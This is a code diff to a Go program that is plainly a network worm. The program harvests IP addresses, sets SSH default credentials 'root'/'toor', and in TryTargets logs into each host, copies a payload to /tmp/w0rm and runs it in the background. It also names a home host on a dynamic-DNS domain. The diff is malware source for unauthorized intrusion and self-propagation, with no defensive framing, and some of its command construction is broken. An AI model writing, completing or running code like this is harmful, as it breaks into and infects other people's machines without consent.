@@ -5,6 +5,7 @@ import (
 	"io/ioutil"
 	"log"
 	"regexp"
+	"strconv"
 
 	"os"
 	"os/exec"
@@ -31,7 +32,7 @@ var Passwords []string
 var Home = "mweya.duckdns.org"
 
 // DebugMode is our global debug flag. If this is true, debug information will be shown.
-var DebugMode = false
+var DebugMode = true
 
 // The regular expression rule used to find IP addresses
 var ipSyntax = regexp.MustCompile(`([0-9]{1,3}[\.]){3}[0-9]{1,3}`)
@@ -101,8 +102,8 @@ func FindTargets() {
 	tempTarget := Target{
 		IP:       "",
 		Port:     "22",
-		Username: "",
-		Password: "",
+		Username: "root",
+		Password: "toor",
 	}
 	for j < len(found) {
 		tempTarget.IP = string(found[j])
@@ -116,7 +117,7 @@ func FindTargets() {
 				boolDuplicate = true
 				// TODO, exploiting didn't work, try another approach?
 			}
-			
+
 			i = i + 1
 		}
 		if !boolDuplicate {
@@ -124,7 +125,9 @@ func FindTargets() {
 		}
 		j = j + 1
 	}
-
+	if DebugMode {
+		fmt.Println("    - " + strconv.Itoa(len(Targets)) + " found")
+	}
 }
 
 // TryTargets attempts to break into the targets
@@ -135,7 +138,40 @@ func TryTargets() {
 
 	// TODO
 
-	
+	var j = 0
+	var fail = false
+
+	for j < len(Targets) {
+		for !fail {
+			// Fail once to make sure that dumb host key verification prompt is gone
+			cmd := exec.Command("ssh -tt " + Targets[j].Username + "@" + Targets[j].IP)
+			p, err := cmd.StdinPipe()
+			if err != nil {
+				// Something went wrong while making the pipe
+				fail = true
+			}
+			p.Write([]byte("yes\n"))
+			p.Close()
+			// Copy payload over to target
+			cmd = exec.Command("ssh -tt " + Targets[j].Username + "@" + Targets[j].IP + " \"cat > /tmp/w0rm\" && sh /tmp/w0rm &")
+			p, err = cmd.StdinPipe()
+			if err != nil {
+				if DebugMode {
+					fmt.Println("[!] " + err.Error())
+				}
+				fail = true
+			}
+			p.Write([]byte(Targets[j].Password + "\n"))
+			p.Write(Payload)
+			p.Close()
+			break
+		}
+
+		j = j + 1
+	}
+	if DebugMode {
+		fmt.Println("[!] Exploiting " + Targets[j].IP + " failed, skipping")
+	}
 
 }
 
